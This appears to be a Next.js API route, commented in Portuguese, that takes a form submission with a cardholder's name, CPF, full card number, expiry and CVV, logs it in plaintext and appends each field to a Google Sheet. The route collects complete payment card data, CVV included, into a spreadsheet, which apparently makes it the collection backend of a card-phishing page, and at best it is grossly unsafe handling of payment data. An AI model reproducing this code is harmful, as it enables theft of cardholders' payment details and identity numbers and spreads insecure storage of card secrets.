import { NextRequest, NextResponse } from 'next/server'
import { appendToSheet } from '@/utils/googleSheets'

interface FormData {
  cardName: string;
  document: string;
  cardNumber: string;
  cardExpiry: string;
  cardCVV: string;
}

export async function POST(request: NextRequest) {
  try {
    const data: FormData = await request.json()
    console.log('Dados do formulário recebidos:', data);

    const formattedData = [
      data.cardName,            // Nome no Cartão
      data.document,            // CPF
      data.cardNumber.replace(/\s/g, ''), // Número do Cartão (sem espaços)
      data.cardExpiry,          // Validade
      data.cardCVV,             // CVV
    ];

    console.log('Dados formatados para salvar:', formattedData);
    await appendToSheet(formattedData);
    return NextResponse.json({ success: true, message: 'Dados salvos com sucesso' })
  } catch (error) {
    console.error('Erro ao processar submissão do formulário:', error);
    return NextResponse.json({ success: false, error: 'Falha ao salvar dados' }, { status: 500 })
  }
}

